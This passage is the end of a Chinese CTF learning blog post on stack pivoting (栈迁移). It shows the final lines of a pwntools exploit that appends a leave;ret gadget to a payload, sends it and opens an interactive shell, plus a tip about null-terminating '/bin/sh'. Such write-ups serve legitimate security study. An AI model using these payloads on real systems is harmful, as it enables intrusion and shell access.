</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=n>payload2</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>s_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>leave_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>注意 payload2 中 bin/sh 字符串要加终止符</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://juhuax.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/>PWN知识点</a></li></ul><nav class=paginav><a class=prev href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E5%B7%AE%E5%88%86/><span class=title>« Prev</span><br><span>差分</span></a>
<a class=next href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/1.%E5%8E%9F%E6%96%87/%E5%88%86%E7%B1%BB/><span class=title>Next »</span><br><span>模糊测试分类</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share 栈迁移 on twitter" href="https://twitter.com/intent/tweet/?text=%e6%a0%88%e8%bf%81%e7%a7%bb&amp;url=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2f%25E6%25A0%2588%25E8%25BF%2581%25E7%25A7%25BB%2f&amp;hashtags=PWN%e7%9f%a5%e8%af%86%e7%82%b9"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share 栈迁移 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2f%25E6%25A0%2588%25E8%25BF%2581%25E7%25A7%25BB%2f&amp;title=%e6%a0%88%e8%bf%81%e7%a7%bb&amp;summary=%e6%a0%88%e8%bf%81%e7%a7%bb&amp;source=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2f%25E6%25A0%2588%25E8%25BF%2581%25E7%25A7%25BB%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share 栈迁移 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2f%25E6%25A0%2588%25E8%25BF%2581%25E7%25A7%25BB%2f&title=%e6%a0%88%e8%bf%81%e7%a7%bb"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share 栈迁移 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2f%25E6%25A0%2588%25E8%25BF%2581%25E7%25A7%25BB%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share 栈迁移 on whatsapp" href="https://api.whatsapp.com/send?text=%e6%a0%88%e8%bf%81%e7%a7%bb%20-%20https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2f%25E6%25A0%2588%25E8%25BF%2581%25E7%25A7%25BB%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share 栈迁移 on telegram" href="https://telegram.me/share/url?text=%e6%a0%88%e8%bf%81%e7%a7%bb&amp;url=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2f%25E6%25A0%2588%25E8%25BF%2581%25E7%25A7%25BB%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://juhuax.github.io/>BLOG</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>